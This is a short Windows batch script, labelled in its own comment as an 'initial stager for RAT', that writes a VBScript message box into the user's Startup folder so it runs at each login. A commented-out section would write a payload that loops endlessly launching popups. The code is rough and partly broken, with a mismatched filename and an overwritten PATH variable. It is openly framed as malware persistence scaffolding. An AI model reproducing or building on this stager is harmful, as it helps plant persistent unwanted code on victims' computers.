@echo off

@REM initial stager for RAT

@REM Variables
PATH = C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup

@REM write pyloads to startup
(echo MsgBox "Line 1" ^& vbCrlf ^& "lin 2", 262192, "Title")> %PATH%/popus.vbs

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM ) > payload.cmd
